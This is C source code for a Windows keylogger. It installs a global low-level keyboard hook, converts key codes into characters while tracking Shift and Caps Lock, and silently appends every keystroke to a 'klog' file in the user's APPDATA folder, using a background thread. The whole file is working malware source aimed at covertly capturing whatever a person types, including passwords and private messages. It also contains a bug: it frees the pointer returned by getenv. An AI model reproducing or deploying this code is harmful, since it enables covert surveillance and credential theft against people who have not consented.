#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "keylogger.h"
#include "types.h"

char* key_withShift = ")!@#$%^&*(";
int keylogger_isCapsOn = 0;
int keylogger_isShiftOn = 0;

int keylogger_cmd = 0;
int keylogger_thread = 0;
char* keylogger_path;
FILE *flog;

LRESULT CALLBACK keyb_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
     int normalPrint = 0;
     int specialKey = 0;
     uint8 pkey = KEY_EMPTY;
     KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

     if(keylogger_cmd != 0)
     {
          return CallNextHookEx(NULL, nCode, wParam, lParam);
     }

     if(wParam == WM_KEYUP)
     {
          pkey = (uint8)pKeyBoard->vkCode;
          
          if(pkey == KEY_CAPS)
          {
               keylogger_isCapsOn = !keylogger_isCapsOn;
               specialKey = 1;
          }

          if(pkey == KEY_SHIFT)
          {
               keylogger_isShiftOn = 0;
               specialKey = 1;
          }

          if(!specialKey)
          {
               if(pkey >= 'A' && pkey <= 'Z')
               {
                    if(keylogger_isCapsOn && keylogger_isShiftOn)
                    {
                         pkey += 0x20;
                    }else if(!keylogger_isCapsOn && !keylogger_isShiftOn){
                         pkey += 0x20;
                    }

                    normalPrint = 1;
               }

               if(keylogger_isShiftOn && pkey >= '0' && pkey <= '9')
               {
                    pkey = key_withShift[pkey - '0'];
                    normalPrint = 1;
               }
          }

          if(normalPrint || pkey == KEY_TAP || pkey == KEY_ENTER || pkey == KEY_SPACE || pkey == KEY_BACKSPACE)
          {
               fputc(pkey, flog);
          }else{
               fputc(keylogger_isShiftOn, flog);
               fputc(pkey, flog);
          }

          fflush(flog);
     }else if(wParam == WM_KEYDOWN){
          pkey = (uint8)pKeyBoard->vkCode;
          
          if(pkey == KEY_SHIFT)
          {
               keylogger_isShiftOn = 1;
          }
     }

     return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int keylogger_func(void* args)
{
     MSG msg;
     HINSTANCE instc = GetModuleHandle(NULL);
     HHOOK hk = SetWindowsHookEx(WH_KEYBOARD_LL, keyb_hook, instc, 0);

     while(!GetMessage(&msg, NULL, NULL, NULL))
     {
          if(keylogger_cmd == 0x1)
          {
               fclose(flog);
               flog = fopen(keylogger_path, "w");
               keylogger_cmd = 0x0;
          }else if(keylogger_cmd == 0x2){
               continue;
          }

          TranslateMessage(&msg);
          DispatchMessage(&msg);
     }
}

void keylogger_Start(void)
{
     int i;
     char* appdata_path = getenv("APPDATA");
     keylogger_path = malloc(strlen(appdata_path) + 5 + sizeof(char));
     sprintf(keylogger_path, "%s\\klog", appdata_path);
     flog = fopen(keylogger_path, "a");
     fseek(flog, 0, SEEK_END);

     if(ftell(flog) == 0)
     {
          fclose(flog);
          flog = fopen(keylogger_path, "w");
     }

     fseek(flog, 0, SEEK_SET);
     free(appdata_path);

     if((GetKeyState(KEY_CAPS) & 0x0001)!=0)
     {
          keylogger_isCapsOn = 1;
     }

     keylogger_cmd = 0;
     keylogger_thread = 1;
     CreateThread(NULL, 0, keylogger_func, NULL, 0, NULL);
}